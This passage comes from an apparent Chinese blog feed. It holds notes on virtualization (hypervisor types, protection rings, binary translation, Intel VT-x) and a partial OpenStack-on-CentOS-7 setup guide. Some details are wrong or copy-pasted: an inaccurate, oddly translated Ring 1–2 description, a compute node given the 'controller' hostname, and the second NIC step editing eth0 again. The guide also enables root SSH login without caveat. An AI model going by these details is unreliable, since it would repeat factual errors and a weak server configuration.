Hypervisor。虚拟机有指令要执行时，Hypervisor会接管该指令，模拟相应的操作。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%A3%B8%E9%87%91%E5%B1%9E%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF.png" alt="裸金属虚拟化技术"></p><h2 id="宿主机虚拟化-Type2">宿主机虚拟化(Type2)</h2><p>宿主机虚拟化，也叫寄居虚拟化。在一个完整的计算机系统中，最底层是物理硬件，物理硬件之上是操作系统，操作系统之上是各类软件和进程。寄居虚拟化便是在主机操作系统之上安装Hypervisor，也叫VMM(Virtual Machine Monitor,虚拟机管理层)，再往上便是虚拟化软件所创建的虚拟户了。</p><p>宿主机虚拟化实现方式是直接安装和运行应用程序即可，便于实现。但是因其主要依托主机操作系统对设备的支持，性能损耗较大。典型的产品为VMware Workstations。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%AF%84%E5%B1%85%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF.png" alt="寄居虚拟化技术"></p><h2 id="操作系统虚拟化-容器">操作系统虚拟化(容器)</h2><p>隔离性差，最后一种不常用，虚拟机运行在传统操作系统上，创建一个独立的虚拟化实例（容器Container），指向底层托管操作系统，缺点是操作系统唯一，如果底层操作系统跑的是Windows，那么VPS/VE就都得跑Windows。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96%E6%9E%B6%E6%9E%84.png" alt="操作系统虚拟化架构"></p><blockquote><p>在宿主架构中的虚拟机作为主机操作系统的一个进程来调度和管理，裸金属架构下则不存在主机操作系统，它是以Hypervisor直接运行在物理硬件之上，即使是有类似主机操作系统的父分区或Domain 0，也是作为裸金属架构下的虚拟机存在的。宿主架构通常用于个人PC上的虚拟化，如WindowsVirtual PC，VMware Workstation，Virtual Box，Qemu等，而裸金属架构通常用于服务器的虚拟化。</p></blockquote><h1 id="虚拟化技术">虚拟化技术</h1><h2 id="Ring环">Ring环</h2><blockquote><p>这部分一定要知道</p></blockquote><p>早期OS在设计时，设计了一个Ring0-Ring3的权限环机制。其中只用到了Ring0和Ring3。</p><ul><li><p><strong>Ring0被称为内核态</strong>，即对硬件的敏感操作均在此；如果这里出现问题，系统很可能会崩溃。因为ring 0可以直接访问CPU和系统内存。</p></li><li><p><strong>Ring1-2</strong>是驱动层。ring 1 和ring 2 提供了ring 3 所缺乏的独特优势。操作系统使用ring 1 与计算机硬件进行交互。这个戒指需要运行命令，例如通过我们监视器上的摄像头流式传输视频。必须与系统存储、加载或保存文件交互的指令存储在ring 2 中。这些权限称为输入和输出权限，因为它们涉及将数据传入和传出工作内存RAM。</p></li><li><p><strong>Ring3被称为用户态</strong>，一般应用软件的正常操作均在此。由于ring 3无法访问CPU或内存，因此涉及这些的任何指令都必须传递给ring 0。</p></li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250215163603266.png" alt="image-20250215163603266"></p><p>当程序运行在用户模式（Ring 3）时，如果需要<strong>执行一个需要更高权限的指令</strong>，比如直接访问硬件设备，它会触发一个陷阱（trap），操作系统会捕获这个陷阱并决定是否允许该操作。如果允许，<strong>操作系统会将CPU切换到更高的特权级别（如Ring 0或1）来执行该指令</strong>。</p><p>但在虚拟化环境中，<strong>这种特权级别的切换会变得更加复杂</strong>。虚拟机监控器（Hypervisor/VMM）需要拦截客户操作系统（Guest OS）发出的敏感指令，<strong>即使该指令在客户机中看似运行在特权级别（如Ring 0）</strong>。由于虚拟化层对硬件资源的绝对控制，客户操作系统的&quot;Ring 0&quot;实际上是经过虚拟化的非特权模式。此时，Hypervisor会通过<strong>陷入再模拟（Trap-and-Emulate）机制</strong>或借助<strong>硬件虚拟化扩展（如Intel VT-x/AMD-V）</strong>，在真正的物理特权级别（如VMX root模式）下模拟该指令的执行，同时确保虚拟化环境的隔离性和安全性。</p><h2 id="特权指令与敏感指令">特权指令与敏感指令</h2><ul><li><strong>特权指令（Privileged Instruction）</strong>：对于系统中一些敏感资源的管理和读写的指令被定位特权指令，只有处于 Ring 0 才能进行正确执行，否则会丢出异常；</li><li><strong>敏感指令（Sensitive Instruction）</strong>：由于虚拟化的引入，由于 OS 现在处于 Ring1 所以不能执行特权指令，所以交由 Ring 0 的 VMM 来处理执行，这部分指令称为敏感指令；可以理解为客户机中必须交由 VMM 处理的指令；</li></ul><p>对于有虚拟化的环境，客户机处于 Ring 1 而不是 Ring 0，如果所有的敏感指令都是特权指令，那么执行任意的敏感指令都会产生 trap，这样保证了客户机中如果进行这些“敏感”操作的指令，都会交给处于 Ring 0 的 VMM 处理；</p><p>敏感指令包括：</p><ol><li>所有 I/O 指令；</li><li>企图访问或者修改 VM mode 或者机器状态的指令；</li><li>企图访问或者修改敏感寄存器 / 存储单元的指令；</li><li>企图访问存储保护系统或内存 / 地址分配系统的指令；</li></ol><p>但是 x86 中有些指令，必须由处于 Ring 0 状态的 VMM 处理，但是工作在 Ring 1 不会产生 <strong>Trap</strong>，这样的话如果处于 Ring 1 的客户机执行这些指令，不会产生 Trap，也不能被定义为特权指令，这与上一句中的目的相冲突，所以必须也要 Trap 这些 “非特权指令”，x86 中称之为 <strong>临界指令（Critical Instructions）</strong>；</p><p>所以 x86 中，<strong>敏感指令 = 特权指令</strong> + <strong>非特权指令 / 临界指令</strong>，如果一个系统上 <strong>敏感指令 = 特权指令</strong>，那么为了让 VMM 完全控制硬件资源，我们让虚拟机上的 OS 处于 Ring 1，不能直接执行 <strong>敏感/特权指令</strong>，而 VMM 处于 RIng 0 ，所以 OS 上执行 <strong>敏感/特权指令</strong> 的时候，就会 <strong>引起陷入 / cause a trap</strong> 到 VMM，再由 VMM 来模拟执行引起异常的指令；</p><p><strong>临界指令</strong> 包括 <strong>敏感指令</strong> 中的 <strong>敏感寄存器指令</strong> 和 <strong>保护系统指令</strong>；</p><h2 id="全虚拟化">全虚拟化</h2><p>也称为原始虚拟化技术，运行在虚拟机上的操作系统通过Hypervisor来最终分享硬件，所以虚拟机发出的指令需经过Hypervisor捕获并处理。</p><p>这是VMware提出的解决方案： BT, Binary Translation 二进制翻译技术, 即将<strong>所有特权指令</strong>通过VMM翻译之后传出, 最后再把结果传回给虚拟机。通过这样的方式, 就成功的欺骗了虚拟机, 让它以为自己在 0 环，即虚拟机不知道自己是虚拟机。如图所示。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%85%A8%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="全虚拟化"></p><p>全虚拟化技术不需要修改客户操作系统，因此具有很好的兼容性和可移植性。但这个方式有个问题，所有的指令都需要VMM进行翻译，性能折扣太高了。</p><h2 id="半虚拟化">半虚拟化</h2><p>思想：将整个<code>Guest OS</code>运行在非特权模式下，遇到敏感指令中的特权指令，可以通过陷入到vmm进行模拟执行。但有些敏感指令不是特权指令，半虚拟化的核心就是将<code>Guest OS</code>中的此类指令全部修改了，通过hypercall直接和vmm通信,从而达到陷入再模拟的效果，<strong>修改操作系统内核来将不可虚拟化的指令替换为hypercalls，在这种情况下虚拟机知道自己是虚拟机</strong>。</p><p>半虚拟化不支持未经修改的操作系统(如Windows 2000/XP)，因此它的兼容性和可移植性较差。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%8D%8A%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="半虚拟化"></p><p>半虚拟实际运行时，要实现定制化的功能，首先要了解 API 的特性，并围绕 API 定制对应的功能，才能在已改变内核的操作系统中实现。</p><p>开源的Xen项目是半虚拟化的一个例子，它使用一个经过修改的Linux内核来虚拟化处理器，而用另外一个定制的虚拟机系统的设备驱动来虚拟化I/O。它通过Domain0进行敏感指令的操作。</p><h2 id="硬件辅助虚拟化">硬件辅助虚拟化</h2><p>虚拟化的核心就是如何保证<code>Guest OS</code>可以正确的执行敏感指令又不破坏vmm，x86 cpu当前的运行级别无法满足要求，所以只能从软件上弥补，但性能上终归差点意思。硬件开发厂商提供了新的方法，给cpu薪资一种模式客户机模式（non-root模式）原先的模式称为root模式，每种模式拥有ring0~ring3。引入两种模式之后，前面讨论的非特权指令的敏感指令在non-root模式下可以重新定义。root模式下表现和原先一样 ，这样就完美的解决了虚拟化漏洞的问题。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%A1%AC%E4%BB%B6%E8%BE%85%E5%8A%A9%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt="硬件辅助虚拟化"></p><h1 id="虚拟化对象">虚拟化对象</h1><h2 id="CPU虚拟化">CPU虚拟化</h2><p>目前主要的 CPU 虚拟化技术是 Intel 的 VT-x/VT-i 和 AMD 的 AMD-V 这两种技术。</p><p>CPU 虚拟化使用的经典模型是「Trap &amp; Emulate」，使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>Hypervisor 运行在最高特权级上，Guest VM 运行在低特权级上，Guest VM 在硬件上直接执行非敏感指令，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 Hypervisor ，此时便能由 Hypervisor 模拟敏感指令的行为。</li><li>当发生 virtual CPU 调度时，我们将 vCPU 的状态保存，恢复 Hypervisor 状态，Hypervisor 完成其行为后进行下一 virtual CPU 的调度，恢复下一 vCPU 的状态并恢复执行。</li></ul><h3 id="纯软件实现CPU虚拟化">纯软件实现CPU虚拟化</h3><p>前文我们已经指出 x86 架构存在<strong>非特权敏感指令，直接导致 VMM 无法截获 x86 VM 的敏感行为</strong>，这违反了 <code>Popek and Goldberg virtualization requirements</code>，因此在硬件对虚拟化的支持出现之前，虚拟化厂商只好先从软件层面下手。</p><h4 id="模拟-解释执行">模拟&amp; 解释执行</h4><p><strong>「模拟」</strong>（Emulate）技术的出现其实早于虚拟化，纯软件的模拟本质上就是通过<strong>编写能够呈现出与被模拟对象相同行为的应用程式从而达到运行非同构平台应用程序的效果</strong>。</p><p>模拟技术不仅能够应用于程序级别的模拟，还能应用于系统级别的模拟：CPU 运行的本质行为其实就是<strong>从 PC 寄存器所指内存区域中不断取出指令解码执行</strong>，我们不难想到的是，实现一个虚拟机最简单粗暴的方法便是通过<strong>模拟每一条指令对应的行为，从而使得 VM 的行为对 VMM 而言是完全可控的</strong>。</p><p>实现模拟技术的原理也是最简单的——我们可以通过<strong>解释执行</strong>的方式来实现模拟技术，即模拟器程序不断地从内存中读取指令，并模拟出每一条指令的效果。从某种程度而言，<strong>每一条指令在执行时都完成了 “陷入”</strong>，因此我们可以使用模拟技术解决虚拟化的漏洞，同时还能模拟与物理机不同架构的虚拟机</p><p><strong>Qemu</strong>——<code>Quick Emulator</code> 本质上便是一个模拟器，其<strong>完整地模拟了一套包括各种外设在内的计算机系统</strong>。</p><p>不过基于解释执行的模拟技术有着一个非常致命的缺点——<strong>性能极差</strong>，因为每一条指令都需要经过 VMM 的解析后再由 VMM 模拟执行，哪怕最简单的一条指令也可能需要分解成多个步骤与多次内存访问，效率极低。</p><p>让我们重新审视我们为什么需要在 x86 架构上使用模拟技术来实现虚拟机：非特权敏感指令的存在打破了 <code>Popek and Goldberg virtualization requirements</code>，但<strong>非特权敏感指令仅是少数，大部分指令我们仍能直接在物理硬件上运行</strong>，因此基于模拟技术进行改进的虚拟化技术出现了：<code>扫描 &amp; 修补</code> 与 <code>二进制翻译</code>。</p><h4 id="扫描-修补">扫描 &amp; 修补</h4><p>虚拟化场景下的虚拟机大都是与物理机有着相同的 ISA，因此我们并没有必要采用纯模拟的技术实现虚拟机，而是可以<strong>让非敏感指令直接在硬件上执行，通过某种方式让非特权敏感指令陷入 VMM</strong>，从而重新实现 Trap &amp; Emulate 模型。</p><p><strong>扫描 &amp; 修补</strong>（Scan &amp; Patch）便是这样的一种技术，其<strong>让非敏感指令直接在硬件上执行</strong>，同时<strong>将系统代码中的敏感指令替换为跳转指令等能陷入 VMM 中的指令</strong>，从而让 VM 在执行敏感指令时能陷入 VMM，使得 VMM 能够模拟执行敏感指令的效果。</p><p>基本执行流程如下：</p><ul><li>VMM 在 VM 执行每段代码之前对其进行扫描，解析每一条指令，查找特权与敏感指令</li><li>VMM 动态生成相应指令的补丁代码，并将原敏感指令替换为一个外跳转以陷入 VMM，从而在 VMM 中执行动态生成的补丁代码</li><li>补丁代码执行结束后，再跳转回 VM 中继续执行下一条代码</li></ul><p>在「扫描 &amp; 修补」技术当中大部分的代码都可以直接在物理 CPU 上运行，其性能损失较小，但「扫描 &amp; 修补」同样存在着一定的缺陷：</p><ul><li>特权指令与敏感指令仍通过模拟执行的方式完成，仍可能造成一定的性能损失</li><li>代码补丁当中引入了额外的跳转，这破坏了代码的局部性</li></ul><blockquote><p>局部性原理：CPU 存取指令 / 数据的内存单元应当趋向于聚集在一个较小的区域</p></blockquote><ul><li>VMM 需要维护一份补丁代码对应的原始代码的副本，这造成了额外的开销</li></ul><h4 id="二进制翻译">二进制翻译</h4><p>为了进一步地提高虚拟化的性能，<strong>「二进制代码翻译」</strong>（Binary Translation）技术应运而生，类似于「扫描 &amp; 修补」技术，二进制代码翻译同样会在运行时动态地修改代码，不过不同的是 BT 技术以<strong>基本块</strong>（只有一个入口和一个出口的代码块）作为翻译的单位：</p><ul><li>Emulator 对读入的二进制代码<strong>翻译</strong>输出为对应 ISA 的一个<strong>不包含特权指令与敏感指令的子集</strong>所构成的代码，使其可以在用户态下安全运行</li><li>Emulator 动态地为当前要运行的基本块开辟一块空间，称之为<strong>翻译缓存</strong>（translation cache），在其中存放着翻译后的代码，每一块 TC 与原代码以某种映射关系（例如哈希表）进行关联</li></ul><blockquote><p>我们可以看出二进制代码翻译技术与扫描修补技术的原理大体上是非常类似的，但是二进制代码翻译技术会对所有的代码进行翻译，而扫描与修补技术则只会 patch 掉敏感指令与特权指令；同时扫描 &amp; 修补技术<strong>不会改变代码的整体结构</strong>，而仅是将敏感与特权指令替换为能触发陷入 VMM 的指令，但是二进制代码翻译技术<strong>会直接改变一个基本块的代码整体结构</strong>（例如翻译前基本块可能长度 40B，翻译后变成 100B，内部代码的相对位置也会发生变化）。</p></blockquote><p>翻译方法大致分为以下两种：</p><ul><li><strong>简单翻译</strong>：可以直接理解为<strong>等效代码模拟</strong>，这种方法实现较为简单，但是会让指令数量大幅膨胀。</li><li><strong>等值翻译</strong>：翻译的<strong>原代码与结果代码相同</strong>。理论上大多数指令都可以使用等值翻译直接在硬件上执行，但这需要更复杂的动态分析技术。</li></ul><p>在相同 ISA 架构上大部分指令都是可以直接进行等值翻译的，除了以下几种：</p><ul><li>PC 相对寻址指令。这类指令的寻址与 PC 相关，但在进行二进制翻译后更改了代码基本块的结构，因此这类指令需要额外插入一些补偿代码来确保寻址的准确，这造成了一定的性能损失。</li><li>直接控制转换。这类指令包括函数调用与跳转指令，其目标地址需要被替换为生成代码的地址。</li><li>间接控制转换。这类指令包括间接调用、返回、间接跳转，其目标地址是在运行时动态得到的，因此我们无法在翻译时确定跳转目标。</li><li>特权指令。对于简单的特权指令可以直接翻译为类似的等值代码（例如 cli 指令可以直接翻译为置 vcpu 的 flags 寄存器的 IF 位为 0），但对于稍微复杂一点的指令，则需要进行深度模拟，利用跳转指令陷入 VMM 中，这通常会造成一定的性能开销。</li></ul><p>由于二进制代码翻译技术使用了更为复杂的过程，由此也会引入更多的问题，对于以下情形则需要额外的处理：</p><ul><li>自修改代码（Self Modifying Code）。这类程序会在运行时修改自身所执行的代码，这需要我们的 Emulator 对新生成的代码进行重翻译。</li><li>自参考代码（Self Referential Code）。这类程序会在运行中读取自己的代码段中内容，这需要我们额外进行处理，使其读取原代码段中内容而非翻译后的代码。</li><li>精确异常（Precise Exceptions）。即在翻译代码执行的过程中发生了中断或异常，这需要将运行状态恢复到原代码执行到异常点时的状态，之后再交给 Guest OS 处理。BT 技术暂很难很好地处理这种情况，因为翻译后的代码与原代码已经失去了逐条对应的关系。一个可行的解决方案就是在发生异常时进行回滚，之后重新使用解释执行的方式。</li><li>实时代码。这类代码对于实时性要求较高，在模拟环境下运行会损失时间精确性，目前暂时无法解决。</li></ul><h3 id="硬件辅助虚拟化-2">硬件辅助虚拟化</h3><p>Intel VT 技术是 Intel 为 x86 虚拟化所提供的硬件支持，其中用于辅助 CPU 虚拟化的是 <code>Intel VT-x</code> 技术，其扩展了传统的 IA32 处理器架构，为 IA32 架构的 CPU 虚拟化提供了硬件支持。</p><p>VT-x 技术为 Intel CPU 额外引入了两种运行模式，统称为 <strong>VMX 操作模式</strong>（Virtual Machine eXtensions），通过 <code>vmxon</code> 指令开启，这两种运行模式<strong>都独立有着自己的分级保护环</strong>：</p><ul><li><code>VMX Root Operation</code>：Hypervisor 所工作的模式，在这个模式下可以访问计算机的所有资源，并对 VM 进行调度。</li><li><code>VMX Non-Root Operation</code>：VM 所工作的模式，在这个模式下仅能访问非敏感资源，对于敏感资源的访问（例如 I/O 操作）会使得 CPU 退出 Non-Root 模式并陷入 Hypervisor 中，由 Hypervisor 处理后再重新进入 Non-Root 模式恢复 VM 的运行。</li></ul><p>由此，我们对 Root 模式与 Non-Root 模式间的切换行为进行定义：</p><ul><li><code>VM-Entry</code>：Hypervisor 保存自身状态信息，切换到 VMX Non-Root 模式，载入 VM 状态信息，恢复 VM 执行流。</li><li><code>VM-Exit</code>：VM 运行暂停并保存自身状态信息，切换到 VMX Root 模式，载入 Hypervisor 状态信息，执行相应的处理函数。</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/intel-vt-x-mode.png" alt="intel-vt-x-mode"></p><p>由于 Non-Root 模式与 Root 模式都各自有着自己的分级保护环，因此 Host OS 与 Guest OS 都可以<strong>不加修改地在自己对应的模式下直接在硬件上运行</strong>，仅有当 Guest OS 涉及到敏感资源的访问及 Host OS 对 VM 的调度时才会发生切换，这在确保了 VM 高性能的同时满足了 <code>Trap &amp; Emulate</code> 模型实现，也解决了 x86 架构的虚拟化漏洞。</p><h4 id="VMCS">VMCS</h4>]]></content>
    
    
    
    <tags>
      
      <tag>虚拟化技术</tag>
      
      <tag>硬件辅助虚拟化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenStack平台搭建</title>
    <link href="/2025/01/08/OpenStack%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/01/08/OpenStack%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>涨了一个大教训，以后如果有官方准备的安装说明文档就再也不看网上的安装教程了。很多步骤的细节都不说明白，导致一直报错，作者也不提醒。</p><h1 id="基础环境-主机准备">基础环境-主机准备</h1><p>OpenStack云平台搭建需要两个节点，一个是controller（控制节点），另一个是compute（计算节点）。</p><table><thead><tr><th>名称</th><th>IP地址</th><th>主机名称</th><th>备注</th></tr></thead><tbody><tr><td>控制节点</td><td>192.168.146.150</td><td>controller</td><td>最小4G,开启虚拟化</td></tr><tr><td>计算节点</td><td>192.168.146.200</td><td>compute1</td><td>最小2G,开启虚拟化</td></tr></tbody></table><h2 id="controller（控制节点）">controller（控制节点）</h2><h3 id="主机安装">主机安装</h3><p>我没有截图标注的部分直接下一步。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108195647601.png" alt="image-20250108195647601"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108195733468.png" alt="image-20250108195733468"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200006319.png" alt="image-20250108200006319"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200024404.png" alt="image-20250108200024404"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200035684.png" alt="image-20250108200035684"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200156324.png" alt="image-20250108200156324"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200437838.png" alt="image-20250108200437838"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200604120.png" alt="image-20250108200604120"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202418908.png" alt="image-20250108202418908"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200727741.png" alt="image-20250108200727741"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108200821337.png" alt="image-20250108200821337"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202506210.png" alt="image-20250108202506210"></p><blockquote><p>此设置是为了修改网卡命名规则为eth规则</p></blockquote><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108202612173.png" alt="image-20250108202612173"></p><p>之后按上下箭头选中Install CentOS 7，不要按回车，随后按下tab键。</p><p>按下空格，输入如下指令后，按回车键。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">net.ifnames=0 biosdevname=0<br></code></pre></td></tr></table></figure><p>之后进入图形化安装界面：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203222232.png" alt="image-20250108203222232"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203329247.png" alt="image-20250108203329247"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203415595.png" alt="image-20250108203415595"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203459938.png" alt="image-20250108203459938"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205645888.png" alt="image-20250108205645888"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205739323.png" alt="image-20250108205739323"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205818666.png" alt="image-20250108205818666"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205937549.png" alt="image-20250108205937549"></p><p>如果输入的密码比较短的话，这里要点击两次完成：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205954270.png" alt="image-20250108205954270"></p><p>等待下面这个进度条结束之后点击重启</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108210416469.png" alt="image-20250108210416469"></p><p>重启之后使用root登录</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108212021905.png" alt="image-20250108212021905"></p><h3 id="修改主机名">修改主机名</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hostnamectl set-hostname controller<br>bash<br>hostname<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109180325082.png" alt="image-20250109180325082"></p><h3 id="修改第一块网卡">修改第一块网卡</h3><p>首先打开虚拟机的虚拟网络编辑器，记住子网掩码和网关。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110112850428.png" alt="image-20250110112850428">再查看一下IP范围</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110112940219.png" alt="image-20250110112940219"></p><p>修改主机ip地址</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p>在IP地址和子网掩码部分，子网掩码就是虚拟机net模式的子网掩码，IP地址就是在IP范围内的随意数即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110144143023.png" alt="image-20250110144143023"></p><p>保存退出后，重启网卡，使网卡生效。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><p>发现报错，查看一下报错信息</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175108548.png" alt="image-20250109175108548"></p><p>这个报错的原因是配置文件中MAC与当前网卡MAC不一致，只需要修改一下配置文件即可。</p><p>通过<code>ip a</code>命令查看mac地址是00:0c:29:bc:d2:97</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175452426.png" alt="image-20250109175452426"></p><p>然后在配置文件中加入这一行（如果存在的话只修改就可以）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">HWADDR=00:0c:29:bc:d2:97<br></code></pre></td></tr></table></figure><p>这时候再重启就没问题了</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175800342.png" alt="image-20250109175800342"></p><h3 id="修改第二块网卡">修改第二块网卡</h3><p>同样，查看主机模式的IP掩码和IP范围，主机模式可以不用设置网关。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109200754419.png" alt="image-20250109200754419"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110152831681.png" alt="image-20250110152831681"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p>这里的IP地址要跟主机模式在同一个网段。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109200710910.png" alt="image-20250109200710910"></p><p>别忘记设置网卡MAC地址<code>HWADDR=00:0c:29:bc:d2:a1</code>。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109193103326.png" alt="image-20250109193103326"></p><p>重启网络服务。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><h3 id="创建ssh连接">创建ssh连接</h3><p>开启sshd服务并更改默认配置文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> sshd<br>vi /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure><p>可能需要更改的地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs config">Port=22  设置SSH的端口号是22(默认端口号为22)<br>PermitRootLogin  yes  设置为yes是允许root用户登陆<br>ClientAliveInterval 60 服务器发送保持活动消息的时间间隔，不希望ssh无操作断连太快就改大一点，比如改成60<br></code></pre></td></tr></table></figure><p>如果找不到这些配置的话，vi有个查找快捷键，进入管理模式，使用<code>/</code>进行查找，然后回车就行。</p><p>重启sshd服务，使配置生效。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">service sshd restart<br></code></pre></td></tr></table></figure><p>开启防火墙端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">firewall-cmd --zone=public --add-port=22/tcp --permanent  <br></code></pre></td></tr></table></figure><p>这样就能使用连接ssh了。</p><p>如果你的ssh连接也报<code>WARNING!The remote SSH server rejected X11 forwarding request.</code>这个错误，那可能是因为没有下载xorg-x11-xauth 的rpm包。在完成1.3yum换源之后，可以下载该包解决此问题。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install xorg-x11-xauth<br></code></pre></td></tr></table></figure><h3 id="设置hosts文件">设置hosts文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/hosts<br></code></pre></td></tr></table></figure><p>添加如下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.146.200 compute1<br></code></pre></td></tr></table></figure><h2 id="compute计算节点">compute计算节点</h2><p>compute节点与controller节点基础环境及安装系统大致相同，可参考controller节点配置，以下是稍有不同的地方。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109214859648.png" alt="image-20250109214859648"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215414205.png" alt="image-20250109215414205"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215437139.png" alt="image-20250109215437139"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215506457.png" alt="image-20250109215506457"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110095136222.png" alt="image-20250110095136222"></p><h3 id="修改主机名-2">修改主机名</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hostnamectl set-hostname controller<br>bash<br>hostname<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110101139519.png" alt="image-20250110101139519"></p><h3 